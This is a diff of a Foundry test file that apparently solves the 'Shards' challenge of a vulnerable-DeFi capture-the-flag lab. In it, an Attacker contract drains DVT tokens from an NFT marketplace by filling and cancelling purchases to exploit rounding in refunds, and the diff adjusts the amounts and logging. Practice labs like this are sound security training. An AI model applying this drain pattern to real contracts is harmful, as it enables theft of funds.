@@ -36,16 +36,14 @@ contract Attacker {
     }
 
     function attack() external{
-        // Approve max DVT spending (even with 0 balance)
         token.approve(address(marketplace), type(uint256).max);
-        // 1. Tiny fill with payment = 0 (want < 133)
         marketplace.fill(offerId, 100);
-        // 2. Immediately cancel to get a dust refund
         marketplace.cancel(offerId, 0); // first purchase at index 0
-        console.log(token.balanceOf(address(this)));
+        console.log(token.balanceOf(address(marketplace)));
 
         // 3. Use the dust to fill a larger amount (payment ~7.5e12 DVT)
-        marketplace.fill(offerId, 1e15);
+        marketplace.fill(offerId, 1e10);
+        console.log(token.balanceOf(address(marketplace)));
         // 4. Cancel the second purchase for a massive refund (~75 DVT)
         marketplace.cancel(offerId, 1); // second purchase at index 1
         console.log(token.balanceOf(address(this)));
@@ -60,20 +58,21 @@ contract Attacker {
     }
 
     function test_math() public view {
-        uint256 price = marketplace.getOffer(offerId);
+        uint256 price = marketplace.getOffer(offerId).price;
+        uint256 totalShards = marketplace.getOffer(offerId).totalShards;
+        uint256 rate = marketplace.rate();
         console.log(price);
+        console.log(totalShards);
+        console.log(rate);
 
-        uint256 want = 1e18;
-        uint256 price = 1_000_000e6;
-        uint256 totalShards = 10_000_000e18;
-        uint256 rate = 75e15;
+        uint256 want = 100;
 
         uint256 payment = want.mulDivDown(
             toDVT(price, rate),
             totalShards
         );
 
-        console2.log("payment =", payment);
+        console.log("payment =", payment);
     }
 }
 
@@ -180,7 +179,7 @@ contract ShardsChallenge is Test {
      */
     function test_shards() public checkSolvedByPlayer {
       Attacker attacker = new Attacker(ShardsNFTMarketplace(marketplace), token, 1, recovery);
-      attacker.test_math();
+      attacker.attack();
     }
 
     /**
